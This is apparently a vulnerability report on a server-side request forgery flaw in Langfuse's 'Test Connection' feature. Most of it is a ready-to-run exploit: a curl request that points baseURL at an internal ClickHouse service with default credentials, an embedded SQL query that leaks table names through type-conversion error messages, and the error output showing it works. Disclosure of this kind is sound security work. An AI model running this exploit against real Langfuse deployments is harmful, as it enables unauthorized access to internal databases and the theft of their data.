## Use case

The Langfuse platform's 'Test Connection' feature allowed an attacker to exploit server-side request forgery (SSRF) due to insufficient validation of user input, leading to unauthorized access to sensitive internal resources, including a ClickHouse database with default credentials.

## Steps to test

1. Create an account on the Langfuse platform and navigate to the settings page.
2. Intercept the request for the 'Test Connection' button using Burp Suite.
3. Modify the 'baseURL' parameter to point to an internal service (e.g., your own server).
4. Observe the response to confirm SSRF is possible.
5. Change the adapter to 'anthropic' to receive detailed error messages.
6. Use the default ClickHouse credentials to attempt authentication and extract data.

## Commands

```text
curl -sk -X POST 'https://langfuse.target.tld/api/trpc/llmApiKey.test' -H 'Content-Type: application/json' -d '{"json":{"projectId":"YOUR_PROJECT_ID","adapter":"anthropic","provider":"exfil","secretKey":"test","baseURL":"http://clickhouse:clickhouse@clickhouse:8123/?query=INSERT+INTO+FUNCTION+null('x+UInt32')+SELECT+toUInt32(name)+FROM+system.tables+WHERE+database='default'+LIMIT+1+FORMAT+JSONEachRow"}}'
// What came back through the Anthropic adapter:
{
"success": false,
"error": "401 Code: 194. DB::Exception: default: Authentication failed:

}
CLICKHOUSE_USER=clickhouse
CLICKHOUSE_PASSWORD=clickhouse  # CHANGEME
# Wrong password:
"401 Code: 194. DB::Exception: clickhouse: Authentication failed"

"Cannot read properties of undefined (reading 'length')"

SELECT toUInt32('hello')
-- ClickHouse responds:
Code: 6. DB::Exception: Cannot parse string 'hello' as UInt32:
syntax error at begin of string.
INSERT INTO FUNCTION null('x UInt32')
SELECT toUInt32(name) FROM system.tables
WHERE database = 'default' LIMIT 1
FORMAT JSONEachRow
```
